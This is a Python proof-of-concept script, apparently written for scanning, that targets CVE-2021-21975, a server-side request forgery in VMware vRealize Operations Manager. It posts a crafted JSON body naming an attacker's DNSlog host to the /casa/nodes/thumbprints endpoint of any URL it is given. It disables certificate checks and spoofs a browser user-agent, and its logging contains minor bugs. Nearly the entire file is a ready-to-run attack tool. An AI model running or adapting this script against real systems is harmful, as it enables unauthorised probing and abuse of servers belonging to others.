from fake_useragent import UserAgent
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

class IOFlow(str):

    def __init__(self) -> None:
        super().__init__()
        self._cout = sys.stdout

    def _write(self, s:str):
        self.cout.write(s)

    def __lshift__(self, s: str)->int:
        return self._cout.write(s)

endl = "\n"
cout = IOFlow()

class Color:
    START       = "\033["
    END         = START+"0m"
    
    C_RED         = START+"31m"
    C_GREEN       = START+"32m"
    C_YELLOW      = START+"33m"
    C_BLUE        = START+"34m"

    # RANDOM_COLOR    = random.choice()

class Color(Color):
    ALL_COLOR       =   {k:v for k, v in Color.__dict__.items() if "C_" in k}
    _COLOR_S        = lambda color, s: color+s+Color.END

class Color(Color):

    RED_S           = lambda s: Color._COLOR_S(Color.C_RED, s)
    GREEN_S         = lambda s: Color._COLOR_S(Color.C_GREEN, s)
    YELLOW_S        = lambda s: Color._COLOR_S(Color.C_YELLOW, s)
    BLUE_S          = lambda s: Color._COLOR_S(Color.C_BLUE, s)

class Log:
    BASE_SYM        = lambda sym: f"{sym}"
    TEMPLATE        = lambda sym, msg: cout << f"{sym} : {msg}\n"

class Log(Log):
    INFO_SYM            = Log.BASE_SYM(Color.BLUE_S("[*]"))
    WARING_SYM          = Log.BASE_SYM(Color.YELLOW_S("[!]"))
    SUCCESS_SYM         = Log.BASE_SYM(Color.GREEN_S("[+]"))

class Log(Log):
    info                = lambda msg: Log.TEMPLATE(Log.INFO_SYM, Color.BLUE_S(msg))
    waring              = lambda msg: Log.TEMPLATE(Log.WARING_SYM,Color.YELLOW_S(msg))
    success             = lambda msg: Log.TEMPLATE(Log.SUCCESS_SYM,Color.GREEN_S(msg))

def info():
    Log.info(f'+------------------------------------------') 
    Log.info(f'Version: VMware vRealize Operations Manager')
    Log.info(f'usage:  python3 poc.py URL DNSLOG')
    Log.info(f'example:  python3 poc.py http://127.0.0.1 www.dnslog.cn')
    Log.info(f'+------------------------------------------')


def CVE_2021_21975(target_url, v):
    vuln_url = target_url + "/casa/nodes/thumbprints"
    headers = {
        "User-Agent": UserAgent().chrome,
        "Content-Type": "application/json;charset=UTF-8"
    }
    data = '["{}"]'.format(v)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=10)
        if response.status_code == 200 :
            Log.success(f'目标 {0} 可能存在SSRF漏洞,请检查 dnslog 响应'.format(target_url))
        else:
            Log.info(f'目标 {0} 不存在漏洞'.format(target_url))
    except Exception as e:
        Log.waring(f'目标 {0} 请求失败'.format(target_url))

if __name__ == '__main__':
    try:
        target_url = sys.argv[1]
        dnslog = sys.argv[2]
        CVE_2021_21975(target_url, dnslog)
    except:
        info()
